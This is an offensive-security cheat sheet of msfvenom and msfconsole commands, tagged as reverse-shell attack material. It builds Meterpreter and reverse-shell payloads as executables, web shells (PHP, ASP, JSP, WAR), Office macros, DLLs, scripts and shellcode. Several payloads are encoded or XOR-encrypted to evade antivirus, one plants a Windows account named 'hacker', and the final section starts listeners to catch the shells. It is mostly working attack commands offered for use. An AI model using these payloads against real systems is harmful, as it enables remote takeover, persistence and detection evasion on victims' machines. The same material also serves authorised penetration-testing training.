# msfvenom

% msfvenom, reverse shell

#plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 

## msfvenom payloads list
```
msfvenom --list payloads
```

## msfvenom - payload windows x86 meterpeter unstagged
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
```

## Linux Meterpreter Reverse Shell
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```

## Windows Meterpreter Reverse TCP Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
```

## Windows Reverse TCP Shell
```
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
```

## Windows Encoded Meterpreter Windows Reverse Shell
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe
```

## Mac Reverse Shell
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho
```

## meterpreter x64 - https - non staged
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
```

## meterpreter - https - staged
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
```

## Web Payloads

## PHP Meterpreter Reverse TCP
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
```

## ASP Meterpreter Reverse TCP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
```

## JSP Java Meterpreter Reverse TCP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
```

## WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
```

## VBA 32bits
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vbapplication
```

## DLL
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o <dll|output.dll>
```

# Scripting Payloads

## Python Reverse Shell
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
```

## Bash Unix Reverse Shell
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
```

## Perl Unix Reverse shell
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl
```

## Powershell
```
msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
```

## Csharp - xor encrypted
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp
```

# msfvenom Shellcode

## Windows Meterpreter Reverse TCP Shellcode
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

## Linux Meterpreter Reverse TCP Shellcode
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

## Mac Reverse TCP Shellcode
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
```

# msfvenom create user 

## MCreate User
```
msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe
```

# msfvenom Handler

## Metasploit Handler tcp 32bits staged
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
```

## Metasploit Handler https 32bits staged
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
```

## Metasploit Handler https 64bits staged
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
```

## Metasploit - Handler https 64bits unstaged
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
```

## Metasploit - Handler https 64bits stagged - encoded xor
```
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
```